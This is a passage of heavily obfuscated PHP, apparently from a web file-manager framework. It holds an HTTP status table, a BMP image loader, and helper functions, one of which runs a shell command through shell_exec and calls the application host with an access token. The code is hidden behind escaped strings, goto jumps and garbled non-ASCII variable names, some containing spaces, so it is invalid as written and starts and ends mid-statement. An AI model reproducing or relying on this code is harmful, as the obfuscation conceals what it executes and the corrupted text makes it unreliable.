"\x4e\x6f\x6e\x2d\101\x75\164\x68\x6f\162\151\164\141\164\x69\x76\145\x20\111\156\146\157\162\x6d\141\164\x69\157\156", "\x32\60\64" => "\116\x6f\x20\103\157\156\164\x65\156\164", "\62\x30\x35" => "\122\145\163\x65\x74\x20\x43\157\x6e\x74\145\156\x74", "\62\x30\66" => "\x50\141\x72\164\x69\141\x6c\x20\103\x6f\156\164\145\x6e\164", "\x32\60\67" => "\115\x75\x6c\x74\151\x2d\x53\164\141\x74\x75\163", "\x33\x30\60" => "\x4d\x75\154\164\151\x70\x6c\145\x20\103\x68\157\151\x63\x65\x73", "\63\x30\61" => "\x4d\157\166\x65\144\40\x50\x65\162\x6d\141\x6e\x65\x6e\x74\x6c\171", "\x33\x30\x32" => "\106\x6f\x75\156\x64", "\63\x30\x33" => "\x53\x65\145\40\x4f\x74\x68\145\162", "\63\60\64" => "\116\157\x74\40\x4d\157\144\x69\x66\x69\x65\x64", "\x33\60\65" => "\x55\163\145\40\120\162\x6f\170\x79", "\x33\60\x37" => "\124\145\155\x70\157\162\x61\x72\x79\40\122\145\x64\151\162\x65\143\164", "\63\x30\70" => "\x50\x65\x72\x6d\x61\156\145\156\x74\40\x52\145\144\151\x72\145\x63\164", "\x34\60\60" => "\x42\x61\144\40\122\145\161\x75\145\x73\164", "\x34\60\61" => "\125\x6e\x61\x75\x74\150\157\x72\151\172\x65\x64", "\64\x30\x32" => "\x50\141\171\x6d\x65\156\x74\40\122\145\161\x75\x69\x72\x65\x64", "\x34\x30\x33" => "\x46\157\162\x62\151\x64\x64\x65\156", "\64\60\x34" => "\x4e\157\164\x20\106\157\x75\x6e\x64", "\x34\x30\65" => "\115\x65\x74\x68\x6f\144\x20\x4e\157\164\40\101\154\154\157\x77\145\144", "\64\60\x36" => "\116\157\x74\x20\x41\143\x63\x65\160\x74\x61\142\x6c\145", "\x34\x30\x37" => "\120\x72\x6f\170\171\40\101\x75\x74\x68\x65\x6e\164\151\x63\141\x74\x69\157\156\x20\x52\x65\x71\x75\151\162\x65\144", "\64\60\70" => "\122\145\x71\165\x65\163\164\40\x54\x69\x6d\145\157\165\164", "\x34\x30\x39" => "\x43\157\x6e\x66\x6c\x69\143\164", "\64\x31\x30" => "\x47\x6f\x6e\145", "\64\x31\61" => "\114\x65\156\147\x74\x68\40\122\x65\x71\x75\151\162\x65\x64", "\x34\x31\62" => "\120\162\145\x63\157\x6e\x64\151\164\151\x6f\156\x20\x46\141\x69\154\145\144", "\x34\61\x33" => "\x52\145\161\x75\145\x73\x74\x20\x45\x6e\x74\x69\x74\171\40\124\157\157\x20\114\x61\x72\147\145", "\64\61\64" => "\122\145\x71\x75\145\163\164\40\x55\122\x49\x20\124\x6f\x6f\40\114\141\162\147\145", "\x34\x31\x35" => "\x55\156\x73\x75\160\x70\x6f\162\164\145\x64\40\x4d\145\144\151\141\40\x54\x79\x70\145", "\64\x31\66" => "\x52\x65\161\x75\x65\x73\x74\145\144\x20\122\x61\156\147\145\40\116\x6f\x74\40\x53\x61\x74\151\163\x66\x69\141\142\x6c\x65", "\64\61\67" => "\x45\170\160\x65\143\164\141\x74\x69\x6f\x6e\40\106\x61\151\154\x65\x64", "\x34\x32\x32" => "\125\156\x70\162\157\143\x65\x73\x73\141\x62\x6c\x65\40\x45\x6e\x74\151\x74\171", "\x34\62\63" => "\x4c\157\x63\x6b\x65\x64", "\x34\62\64" => "\x46\141\x69\154\x65\x64\x20\104\x65\160\x65\x6e\x64\145\156\x63\x79", "\x34\62\65" => "\x55\156\157\x72\144\145\x72\x65\x64\40\103\x6f\x6c\x6c\145\143\164\151\157\156", "\64\62\x36" => "\125\x70\x67\x72\141\144\x65\x20\x52\x65\x71\165\x69\x72\x65\144", "\x34\62\70" => "\120\162\145\x63\x6f\156\x64\x69\164\151\x6f\x6e\40\x52\x65\x71\x75\x69\162\145\x64", "\64\x32\71" => "\124\x6f\157\x20\115\x61\156\171\40\122\x65\161\x75\x65\163\x74\163", "\x34\63\x31" => "\122\145\x71\x75\x65\x73\x74\x20\110\145\141\x64\145\162\40\x46\151\145\x6c\x64\163\x20\124\x6f\x6f\40\114\x61\162\147\145", "\64\x34\x34" => "\x4e\x6f\40\x52\x65\163\160\157\x6e\163\x65", "\64\x35\x30" => "\x42\x6c\157\143\x6b\145\144\x20\x62\171\40\127\x69\x6e\144\157\167\x73\40\120\x61\162\x65\x6e\164\x61\x6c\x20\103\x6f\156\x74\x72\x6f\x6c\163", "\64\x35\x31" => "\125\156\141\x76\x61\151\x6c\x61\x62\x6c\145\40\106\x6f\162\x20\114\x65\147\x61\x6c\x20\x52\145\x61\x73\x6f\156\163", "\x34\71\64" => "\x52\145\161\165\x65\163\164\x20\110\x65\141\x64\x65\162\x20\x54\x6f\x6f\40\x4c\x61\x72\x67\x65", "\65\x30\x30" => "\111\x6e\164\145\x72\156\x61\154\x20\x53\145\x72\x76\x65\x72\x20\x45\x72\162\x6f\x72", "\x35\x30\x31" => "\116\x6f\x74\x20\x49\x6d\x70\x6c\145\x6d\x65\x6e\x74\145\144", "\x35\x30\x32" => "\x42\141\144\x20\107\x61\x74\x65\x77\x61\171", "\x35\x30\63" => "\123\145\x72\166\x69\143\x65\x20\125\x6e\x61\x76\141\151\154\x61\142\154\x65", "\x35\x30\x34" => "\107\x61\164\x65\167\141\171\x20\124\x69\155\145\x6f\165\x74", "\x35\x30\x35" => "\110\124\124\120\x20\126\x65\x72\163\151\157\x6e\40\x6e\x6f\164\40\163\165\160\160\x6f\x72\164\x65\x64", "\65\x30\x37" => "\x49\x6e\x73\x75\146\146\x69\143\151\x65\x6e\x74\40\123\x74\x6f\162\x61\147\x65"); public static function code($eÏÉŒÛÈ°Ó) { $bé©±›§† =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÏÉŒÛÈ°Ó = $eÏÉŒÛÈ°Ó . $bé©±›§†[33]; $EÊ¡ø¯Ò“ = self::$statusCode[$eÏÉŒÛÈ°Ó]; $EÊ¡ø¯Ò“ = $EÊ¡ø¯Ò“ ? "\110\x54\124\120\57\61\x2e\x31\x20{$eÏÉŒÛÈ°Ó}\40" . $EÊ¡ø¯Ò“ : $bé©±›§†[33]; return $EÊ¡ø¯Ò“; } } class ImageGdBMP { public static function load($Bì„‰ºâ¶å) { $dåÔ…‰îª = fopen($Bì„‰ºâ¶å, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1521]); if ($dåÔ…‰îª === !1) { return !1; } $aˆÉ§Ä·ÁÕ = self::loadFromStream($dåÔ…‰îª); fclose($dåÔ…‰îª); return $aˆÉ§Ä·ÁÕ; } public static function loadFromStream($D°Íº—„ÓË) { $fèàˆÚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FêÀëõ’â = fread($D°Íº—„ÓË, 14); if ($FêÀëõ’â === !1) { return !1; } if ($FêÀëõ’â[0] != $fèàˆÚ[1833] || $FêÀëõ’â[1] != $fèàˆÚ[1834]) { return !1; } $bï…„Ùä·¢ = unpack($fèàˆÚ[1835] . $fèàˆÚ[1836] . $fèàˆÚ[1837] . $fèàˆÚ[1838] . $fèàˆÚ[1839], $FêÀëõ’â); return self::loadFromStreamAndFileHeader($D°Íº—„ÓË, $bï…„Ùä·¢); } public static function loadFromStreamAndFileHeader($fÂ…ß‡É«é, array $dö©ø‚î»í) { goto AÌÛ›æöÃá; FÊèí¥–­: if ($e±Á¡½¶×¥ === !1) { return !1; } list(, $bÊ‹‡ÓàŞ‰) = unpack($b­ºêñÀØá[1840], $e±Á¡½¶×¥); if ($bÊ‹‡ÓàŞ‰ == 12) { goto fŒíÉÂÃÄ; fŒíÉÂÃÄ: $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, $bÊ‹‡ÓàŞ‰ - 4); if ($e±Á¡½¶×¥ === !1) { return !1; } extract(unpack($b­ºêñÀØá[1841] . $b­ºêñÀØá[1842] . $b­ºêñÀØá[1843] . $b­ºêñÀØá[1844], $e±Á¡½¶×¥)); goto e»éŠ£Ø††; B¨Š¹‘¹Ş: $a ·…–¥Â‹ = 255; goto b—ÌÄÄì©š; e»éŠ£Ø††: $E‰ùŒ™Ñó = $b¾˜æÏëïÛ = $aÛğÃé½ëŸ = $dª¥ÂœÄ = 0; $fŒˆÀÑóÂ¹ = 16711680; $A§…¢Îí±† = 65280; goto B¨Š¹‘¹Ş; b—ÌÄÄì©š: } else { if (124 < $bÊ‹‡ÓàŞ‰ || $bÊ‹‡ÓàŞ‰ < 40) { return !1; } else { goto DãµŒ†®ã£; C‰©ƒÊÎÅá: if (($F¢ ¯Íˆ == 16 || $F¢ ¯Íˆ == 24 || $F¢ ¯Íˆ == 32) && $dª¥ÂœÄ == 0 && $fŒˆÀÑóÂ¹ == 0 && $A§…¢Îí±† == 0 && $a ·…–¥Â‹ == 0) { switch ($F¢ ¯Íˆ) { case 16: $fŒˆÀÑóÂ¹ = 31744; $A§…¢Îí±† = 992; $a ·…–¥Â‹ = 31; break; case 24: case 32: $fŒˆÀÑóÂ¹ = 16711680; $A§…¢Îí±† = 65280; $a ·…–¥Â‹ = 255; break; } } goto E÷¯ÈÏ£ïˆ; DãµŒ†®ã£: $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, 36); if ($e±Á¡½¶×¥ === !1) { return !1; } extract(unpack($b­ºêñÀØá[1845] . $b­ºêñÀØá[1846] . $b­ºêñÀØá[1843] . $b­ºêñÀØá[1847] . $b­ºêñÀØá[1848] . $b­ºêñÀØá[1849] . $b­ºêñÀØá[1850] . $b­ºêñÀØá[1851] . $b­ºêñÀØá[1852] . $b­ºêñÀØá[1853], $e±Á¡½¶×¥)); goto c’Ï»Á‚øö; bø¦ÖîŠ‘Ú: if ($A‘Ö¿¸ãÍ & 2147483648) { $A‘Ö¿¸ãÍ = -(~$A‘Ö¿¸ãÍ & 4294967295) - 1; } if ($dö©ø‚î»í[$b­ºêñÀØá[522]] != 0) { $B½×åµ¨Ù = $F¢ ¯Íˆ == 1 || $F¢ ¯Íˆ == 4 || $F¢ ¯Íˆ == 8 ? ($E‰ùŒ™Ñó ? $E‰ùŒ™Ñó : pow(2, $F¢ ¯Íˆ)) << 2 : 0; $Bôğ¶İçºÎ = $c‡áÕ»½ìò ? $c‡áÕ»½ìò : ($BŒĞŞî²Ëô * $F¢ ¯Íˆ + 31 >> 3 & ~3) * abs($c–ñŠ±İÏ–); $F‰ù«ç « = $dö©ø‚î»í[$b­ºêñÀØá[522]] - $Bôğ¶İçºÎ - $B½×åµ¨Ù - 14; if ($bÊ‹‡ÓàŞ‰ < $F‰ù«ç « && 40 <= $bÊ‹‡ÓàŞ‰ && $bÊ‹‡ÓàŞ‰ <= 124) { $bÊ‹‡ÓàŞ‰ = $F‰ù«ç «; } } if ($bÊ‹‡ÓàŞ‰ - 40 > 0) { $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, $bÊ‹‡ÓàŞ‰ - 40); if ($e±Á¡½¶×¥ === !1) { return !1; } extract(unpack($b­ºêñÀØá[1854] . $b­ºêñÀØá[1855] . $b­ºêñÀØá[1856] . $b­ºêñÀØá[1857], $e±Á¡½¶×¥ . str_repeat($b­ºêñÀØá[1858], 120))); } else { $aÛğÃé½ëŸ = $fŒˆÀÑóÂ¹ = $A§…¢Îí±† = $a ·…–¥Â‹ = 0; } goto C‰©ƒÊÎÅá; c’Ï»Á‚øö: if ($BŒĞŞî²Ëô & 2147483648) { $BŒĞŞî²Ëô = -(~$BŒĞŞî²Ëô & 4294967295) - 1; } if ($c–ñŠ±İÏ– & 2147483648) { $c–ñŠ±İÏ– = -(~$c–ñŠ±İÏ– & 4294967295) - 1; } if ($E—Ø¹¢¿…Ï & 2147483648) { $E—Ø¹¢¿…Ï = -(~$E—Ø¹¢¿…Ï & 4294967295) - 1; } goto bø¦ÖîŠ‘Ú; E÷¯ÈÏ£ïˆ: } } goto b®ĞÑäç; AÌÛ›æöÃá: $b­ºêñÀØá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($dö©ø‚î»í[$b­ºêñÀØá[388]] != 19778) { return !1; } $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, 4); goto FÊèí¥–­; b®ĞÑäç: if ($BŒĞŞî²Ëô == 0 || $c–ñŠ±İÏ– == 0 || $F¯½Ó÷ñ† != 1 || ($aÛğÃé½ëŸ & $fŒˆÀÑóÂ¹) != 0 || ($aÛğÃé½ëŸ & $A§…¢Îí±†) != 0 || ($aÛğÃé½ëŸ & $a ·…–¥Â‹) != 0 || ($fŒˆÀÑóÂ¹ & $A§…¢Îí±†) != 0 || ($fŒˆÀÑóÂ¹ & $a ·…–¥Â‹) != 0 || ($A§…¢Îí±† & $a ·…–¥Â‹) != 0) { return !1; } if ($dª¥ÂœÄ == 4 || $dª¥ÂœÄ == 5) { $e±Á¡½¶×¥ = stream_get_contents($fÂ…ß‡É«é, $c‡áÕ»½ìò); if ($e±Á¡½¶×¥ === !1) { return !1; } return imagecreatefromstring($e±Á¡½¶×¥); } $aò»Õ©éê = $BŒĞŞî²Ëô * $F¢ ¯Íˆ + 31 >> 3 & ~3; goto Eš»ˆÅÉ„; Eš»ˆÅÉ„: $FÕÑ…Ùì§ = abs($c–ñŠ±İÏ–); $e¥¶‚ÀŞ¯¹ = $c–ñŠ±İÏ– > 0 ? $FÕÑ…Ùì§ - 1 : 0; $bë‚öÍ±ÖÕ = $c–ñŠ±İÏ– > 0 ? -1 : 1; goto Dİ¡–²¬; Dİ¡–²¬: if ($F¢ ¯Íˆ == 1 || $F¢ ¯Íˆ == 4 || $F¢ ¯Íˆ == 8) { goto b™…¤ô•›; b™…¤ô•›: $aˆÌïã†Ó = imagecreate($BŒĞŞî²Ëô, $FÕÑ…Ùì§); $E„ŒÕ¨Œ– = $bÊ‹‡ÓàŞ‰ == 12 ? 3 : 4; $Bø‡Óª¨ê© = $E‰ùŒ™Ñó ? $E‰ùŒ™Ñó : pow(2, $F¢ ¯Íˆ); goto aáİ‘¥¥„á; d–œîŒ—ëå: $a§â»ï³­ = (1 << $F¢ ¯Íˆ) - 1 << $FÉÔÙ·áö‘; if ($dª¥ÂœÄ == 1 || $dª¥ÂœÄ == 2) { $EÏ˜âº™¥Š = 0; $c›ËÈï¶‚Ã = $F¢ ¯Íˆ >> 2 & 1; for (;;) { if ($EÏ˜âº™¥Š < -1 || $EÏ˜âº™¥Š > $BŒĞŞî²Ëô || $e¥¶‚ÀŞ¯¹ < -1 || $e¥¶‚ÀŞ¯¹ > $c–ñŠ±İÏ–) { imagedestroy($aˆÌïã†Ó); return !1; } $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, 1); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } switch ($e±Á¡½¶×¥) { case $b­ºêñÀØá[1858]: $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, 1); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } switch ($e±Á¡½¶×¥) { case $b­ºêñÀØá[1858]: $e¥¶‚ÀŞ¯¹ += $bë‚öÍ±ÖÕ; $EÏ˜âº™¥Š = 0; break; case $b­ºêñÀØá[1860]: $e¥¶‚ÀŞ¯¹ = 0; $EÏ˜âº™¥Š = 0; break 3; case $b­ºêñÀØá[1861]: $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, 2); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } list(, $d³˜Í¹‰Ù, $dÓÊ’—Ğæ) = unpack($b­ºêñÀØá[1862], $e±Á¡½¶×¥); $EÏ˜âº™¥Š += $d³˜Í¹‰Ù; $e¥¶‚ÀŞ¯¹ += $dÓÊ’—Ğæ * $bë‚öÍ±ÖÕ; break; default: list(, $BÄÜ´İÈ«À) = unpack($b­ºêñÀØá[1863], $e±Á¡½¶×¥); $A£ÄèöÒ‹ = ($BÄÜ´İÈ«À >> $c›ËÈï¶‚Ã) + ($BÄÜ´İÈ«À & $c›ËÈï¶‚Ã); $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, $A£ÄèöÒ‹ + 1 & ~1); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } for ($AÏ©ÓÈ—ˆ = 0, $e¹ËàöÓ• = 0; $AÏ©ÓÈ—ˆ < $BÄÜ´İÈ«À; ++$AÏ©ÓÈ—ˆ, ++$EÏ˜âº™¥Š, $e¹ËàöÓ• += $F¢ ¯Íˆ) { list(, $bÔîòöŞãå) = unpack($b­ºêñÀØá[1863], $e±Á¡½¶×¥[$e¹ËàöÓ• >> 3]); $eÒ‹çÈ›’š = $e¹ËàöÓ• & 7; imagesetpixel($aˆÌïã†Ó, $EÏ˜âº™¥Š, $e¥¶‚ÀŞ¯¹, $eĞË„ÑİÑß[($bÔîòöŞãå & $a§â»ï³­ >> $eÒ‹çÈ›’š) >> $FÉÔÙ·áö‘ - $eÒ‹çÈ›’š]); } break; } break; default: $c‹çª‘À¥ = fread($fÂ…ß‡É«é, 1); if ($c‹çª‘À¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } list(, $F´Ò¦‚Àø, $bÔîòöŞãå) = unpack($b­ºêñÀØá[1862], $e±Á¡½¶×¥ . $c‹çª‘À¥); for ($AÏ©ÓÈ—ˆ = 0, $e¹ËàöÓ• = 0; $AÏ©ÓÈ—ˆ < $F´Ò¦‚Àø; ++$AÏ©ÓÈ—ˆ, ++$EÏ˜âº™¥Š, $e¹ËàöÓ• += $F¢ ¯Íˆ) { $eÒ‹çÈ›’š = $e¹ËàöÓ• & 7; imagesetpixel($aˆÌïã†Ó, $EÏ˜âº™¥Š, $e¥¶‚ÀŞ¯¹, $eĞË„ÑİÑß[($bÔîòöŞãå & $a§â»ï³­ >> $eÒ‹çÈ›’š) >> $FÉÔÙ·áö‘ - $eÒ‹çÈ›’š]); } break; } } } else { for ($C¨£áÚ¢ï = 0; $C¨£áÚ¢ï < $FÕÑ…Ùì§; ++$C¨£áÚ¢ï, $e¥¶‚ÀŞ¯¹ += $bë‚öÍ±ÖÕ) { $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, $aò»Õ©éê); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } $e¹ËàöÓ• = 0; for ($EÏ˜âº™¥Š = 0; $EÏ˜âº™¥Š < $BŒĞŞî²Ëô; ++$EÏ˜âº™¥Š, $e¹ËàöÓ• += $F¢ ¯Íˆ) { list(, $bÔîòöŞãå) = unpack($b­ºêñÀØá[1863], $e±Á¡½¶×¥[$e¹ËàöÓ• >> 3]); $eÒ‹çÈ›’š = $e¹ËàöÓ• & 7; imagesetpixel($aˆÌïã†Ó, $EÏ˜âº™¥Š, $e¥¶‚ÀŞ¯¹, $eĞË„ÑİÑß[($bÔîòöŞãå & $a§â»ï³­ >> $eÒ‹çÈ›’š) >> $FÉÔÙ·áö‘ - $eÒ‹çÈ›’š]); } } } goto A±¿¼ëÓÅ´; aáİ‘¥¥„á: $eĞË„ÑİÑß = array(); for ($AÏ©ÓÈ—ˆ = 0; $AÏ©ÓÈ—ˆ < $Bø‡Óª¨ê©; ++$AÏ©ÓÈ—ˆ) { $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, $E„ŒÕ¨Œ–); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } extract(unpack($b­ºêñÀØá[1859], $e±Á¡½¶×¥ . $b­ºêñÀØá[1858])); $eĞË„ÑİÑß[] = imagecolorallocate($aˆÌïã†Ó, $DÇ±ÑŠŠšç, $D’ÒèĞÜÉö, $eÒ‹çÈ›’š); } $FÉÔÙ·áö‘ = 8 - $F¢ ¯Íˆ; goto d–œîŒ—ëå; A±¿¼ëÓÅ´: } else { goto E¥ÜŠ¤ò‰; E¥ÜŠ¤ò‰: $aˆÌïã†Ó = imagecreatetruecolor($BŒĞŞî²Ëô, $FÕÑ…Ùì§); imagealphablending($aˆÌïã†Ó, !1); if ($aÛğÃé½ëŸ) { imagesavealpha($aˆÌïã†Ó, !0); } goto Bƒ§èƒ—‚¿; Bƒ§èƒ—‚¿: $bÃåÌÂÊéœ = $F¢ ¯Íˆ >> 3; $aÂ÷«Ù—·ß = $aÛğÃé½ëŸ ? 127 : 0; $eë„ø…ëØ‹ = $aÛğÃé½ëŸ ? 1 / $aÛğÃé½ëŸ : 1; goto c´ÈÆ‘ôùó; d–Ñ ‹±íø: for ($C¨£áÚ¢ï = 0; $C¨£áÚ¢ï < $FÕÑ…Ùì§; ++$C¨£áÚ¢ï, $e¥¶‚ÀŞ¯¹ += $bë‚öÍ±ÖÕ) { $e±Á¡½¶×¥ = fread($fÂ…ß‡É«é, $aò»Õ©éê); if ($e±Á¡½¶×¥ === !1) { imagedestroy($aˆÌïã†Ó); return !1; } $e¹ËàöÓ• = 0; for ($EÏ˜âº™¥Š = 0; $EÏ˜âº™¥Š < $BŒĞŞî²Ëô; ++$EÏ˜âº™¥Š, $e¹ËàöÓ• += $bÃåÌÂÊéœ) { list(, $bÔîòöŞãå) = unpack($b­ºêñÀØá[1840], substr($e±Á¡½¶×¥, $e¹ËàöÓ•, $bÃåÌÂÊéœ) . $b­ºêñÀØá[1864]); $E £Ï®Š” = $bÔîòöŞãå & $aÛğÃé½ëŸ; $b‰¿Ø§¸«™ = $bÔîòöŞãå & $fŒˆÀÑóÂ¹; $bÙ¥ø‡öÂŠ = $bÔîòöŞãå & $A§…¢Îí±†; $cŒÅ­ì¶˜” = $bÔîòöŞãå & $a ·…–¥Â‹; $E¿ïÎî¦Ü = $aÂ÷«Ù—·ß - (($E £Ï®Š” << 7) - $E £Ï®Š”) * $eë„ø…ëØ‹; $DÇ±ÑŠŠšç = (($b‰¿Ø§¸«™ << 8) - $b‰¿Ø§¸«™) * $EİºÛÒ”Ÿ×; $D’ÒèĞÜÉö = (($bÙ¥ø‡öÂŠ << 8) - $bÙ¥ø‡öÂŠ) * $fÏ£Ó´Ù¦»; $eÒ‹çÈ›’š = (($cŒÅ­ì¶˜” << 8) - $cŒÅ­ì¶˜”) * $Bî‹İÂÚÊ©; imagesetpixel($aˆÌïã†Ó, $EÏ˜âº™¥Š, $e¥¶‚ÀŞ¯¹, $E¿ïÎî¦Ü << 24 | $DÇ±ÑŠŠšç << 16 | $D’ÒèĞÜÉö << 8 | $eÒ‹çÈ›’š); } } imagealphablending($aˆÌïã†Ó, !0); goto F³Ğ¥ÆËƒø; c´ÈÆ‘ôùó: $EİºÛÒ”Ÿ× = $fŒˆÀÑóÂ¹ ? 1 / $fŒˆÀÑóÂ¹ : 1; $fÏ£Ó´Ù¦» = $A§…¢Îí±† ? 1 / $A§…¢Îí±† : 1; $Bî‹İÂÚÊ© = $a ·…–¥Â‹ ? 1 / $a ·…–¥Â‹ : 1; goto d–Ñ ‹±íø; F³Ğ¥ÆËƒø: } return $aˆÌïã†Ó; goto eİİãÙØá; eİİãÙØá: } } goto Däù»çÕÃæ; E¸ÄëÆ…²: function ActionCall($B›©Ä‰½ñô) { $b™Õò«ÎÂ = array_slice(func_get_args(), 1); return ActionApply($B›©Ä‰½ñô, $b™Õò«ÎÂ); } function ActionCallApi($eëÖõÁ¼ŠÆ, $CÂá•ãª¤ = '') { goto F­ÜÖè°Ñù; Eº“ÔÒ•İ•: $AÑÚÕâ³ù = phpBinCommand(); if ($AÑÚÕâ³ù && function_exists($a×ñ·Æ»ö«[21])) { $B™‚â˜¾©ï = $AÑÚÕâ³ù . $a×ñ·Æ»ö«[22] . BASIC_PATH . $a×ñ·Æ»ö«[23] . escapeshellarg($eëÖõÁ¼ŠÆ); $A—ŸÎÂÈÊ” = shell_exec($B™‚â˜¾©ï); } if (!$A—ŸÎÂÈÊ”) { $d°Ü‡ôÑä¶ = stream_context_create(array($a×ñ·Æ»ö«[24] => array($a×ñ·Æ»ö«[25] => 20, $a×ñ·Æ»ö«[26] => $a×ñ·Æ»ö«[27]))); $A—ŸÎÂÈÊ” = file_get_contents(APP_HOST . $a×ñ·Æ»ö«[28] . $eëÖõÁ¼ŠÆ, !1, $d°Ü‡ôÑä¶); } goto aÙ‰Ìºà£†; F­ÜÖè°Ñù: $a×ñ·Æ»ö« =& $_SERVER[¡Áã]; $B˜½»‰Èõ = $CÂá•ãª¤; if (is_array($CÂá•ãª¤)) { $B˜½»‰Èõ = $a×ñ·Æ»ö«[16]; foreach ($CÂá•ãª¤ as $f¿§©ÏË => $AÊªÃ°¼¤¯) { $AÊªÃ°¼¤¯ = is_array($AÊªÃ°¼¤¯) ? json_encode($AÊªÃ°¼¤¯) : $AÊªÃ°¼¤¯; $AÊªÃ°¼¤¯ = is_bool($AÊªÃ°¼¤¯) ? intval($AÊªÃ°¼¤¯) : $AÊªÃ°¼¤¯; $B˜½»‰Èõ .= $a×ñ·Æ»ö«[17] . $f¿§©ÏË . $a×ñ·Æ»ö«[18] . rawurlencode($AÊªÃ°¼¤¯); } } goto a¯Ô¥ºÎ˜º; a¯Ô¥ºÎ˜º: $D´„Š¡‚‰ = Action($a×ñ·Æ»ö«[19])->accessToken(); $eëÖõÁ¼ŠÆ = str_replace($a×ñ·Æ»ö«[5], $a×ñ·Æ»ö«[4], $eëÖõÁ¼ŠÆ) . $a×ñ·Æ»ö«[20] . $D´„Š¡‚‰ . $B˜½»‰Èõ; $A—ŸÎÂÈÊ” = $a×ñ·Æ»ö«[16]; goto Eº“ÔÒ•İ•; A·¬ÀÜŞàö: return $A„ôãï­ß; goto eò«İÙ‰¿×; aÙ‰Ìºà£†: $A¥÷—ƒ Äò = json_decode($A—ŸÎÂÈÊ”, !0); $A„ôãï­ß = is_array($A¥÷—ƒ Äò) ? $A¥÷—ƒ Äò : array($a×ñ·Æ»ö«[29] => null, $a×ñ·Æ»ö«[30] => $A—ŸÎÂÈÊ”); if (!$A¥÷—ƒ Äò) { echo $A—ŸÎÂÈÊ”; } goto A·¬ÀÜŞàö; eò«İÙ‰¿×: } function ActionCallHook($bİ­ß¿ïô) { goto E—Á¥ß–è; eÅô­·Êº: $eøƒŒ¼¬¾ = $bÌšÈŞ¸ç ? json_decode($bÌšÈŞ¸ç, !0) : $eøƒŒ¼¬¾; $GLOBALS[$b“§õ¨Æõ‚[31]] = 0; return $eøƒŒ¼¬¾; goto Bù…°¯Ğ; E—Á¥ß–è: $b“§õ¨Æõ‚ =& $_SERVER[¡Áã]; ob_start(); $AÇøÜÈÂ‚Î = array_slice(func_get_args(), 1); goto Bƒ¿Ì£àß; Bƒ¿Ì£àß: $GLOBALS[$b“§õ¨Æõ‚[31]] = 1; $eøƒŒ¼¬¾ = ActionApply($bİ­ß¿ïô, $AÇøÜÈÂ‚Î); $bÌšÈŞ¸ç = ob_get_clean(); goto eÅô­·Êº; Bù…°¯Ğ: } goto BÅ½éŞãˆæ; dª‹Ğ‘¶öø: register_shutdown_function($_SERVER[¡Áã][32]); set_error_handler($_SERVER[¡Áã][46], $fŠÊ÷àÒÌ³); if (function_exists($_SERVER[¡Áã][47])) { set_exception_handler($_SERVER[¡Áã][48]); } goto bÉ‘Ú’ƒß…; B¯ÙÙÙĞ¤: function Action($d±ğ…œãØê = '') { goto B•Î‘É¸§; BÚÌ¯Â…‹Ä: $b—«ÍâÒÑ[$fÚÛ¬„Æ®ø] = new $dğ»ö»¾Ö˜(); $b—«ÍâÒÑ[$bÂïƒ“ˆÑ] = $b—«ÍâÒÑ[$fÚÛ¬„Æ®ø]; return $b—«ÍâÒÑ[$fÚÛ¬„Æ®ø]; goto a‘â–ğÓâˆ; Dò»òÆì¹ß: if (isset($b—«ÍâÒÑ[$fÚÛ¬„Æ®ø])) { return $b—«ÍâÒÑ[$fÚÛ¬„Æ®ø]; } if (is_file($D¼ÅèªƒÛğ)) { include_once $D¼ÅèªƒÛğ; } if (!class_exists($dğ»ö»¾Ö˜)) { return actionCallError("\133{$d±ğ…œãØê}\40\x3d\76\x20{$dğ»ö»¾Ö˜}\135\x20\143\154\x61\x73\163\x20\x6e\157\x74\x20\x65\x78\x69\163\164\x73\x21"); } goto BÚÌ¯Â…‹Ä; dº—ãˆË¨í: if (isset($b—«ÍâÒÑ[$bÂïƒ“ˆÑ])) { return $b—«ÍâÒÑ[$bÂïƒ“ˆÑ]; } $d±ğ…œãØê = trim(str_replace($b¸ç…øôÚ´[4], $b¸ç…øôÚ´[5], $d±ğ…œãØê), $b¸ç…øôÚ´[4]); $e†‹¥‚‘´ï = explode($b¸ç…øôÚ´[5], $d±ğ…œãØê); goto AÕŠ…ùº´ù; AÕŠ…ùº´ù: $dï™‹ˆÕ› = strtolower($e†‹¥‚‘´ï[0]); if (substr($dï™‹ˆÕ›, -6) == $b¸ç…øôÚ´[6]) { $d±ğ…œãØê = substr($e†‹¥‚‘´ï[0], 0, -6); $dğ»ö»¾Ö˜ = $d±ğ…œãØê . $b¸ç…øôÚ´[7]; $D¼ÅèªƒÛğ = $b¸ç…øôÚ´[8]; if (isset($e†‹¥‚‘´ï[1]) && substr(strtolower($e†‹¥‚‘´ï[1]), -5) == $b¸ç…øôÚ´[9]) { $dğ»ö»¾Ö˜ = $d±ğ…œãØê . $e†‹¥‚‘´ï[1]; $D¼ÅèªƒÛğ = $b¸ç…øôÚ´[10] . $e†‹¥‚‘´ï[1] . $b¸ç…øôÚ´[11]; } else { if (count($e†‹¥‚‘´ï) == 3) { $dğ»ö»¾Ö˜ = $d±ğ…œãØê . $e†‹¥‚‘´ï[1] . $e†‹¥‚‘´ï[2]; $D¼ÅèªƒÛğ = $b¸ç…øôÚ´[12] . $e†‹¥‚‘´ï[1] . $b¸ç…øôÚ´[13] . $e†‹¥‚‘´ï[2] . $b¸ç…øôÚ´[11]; } } 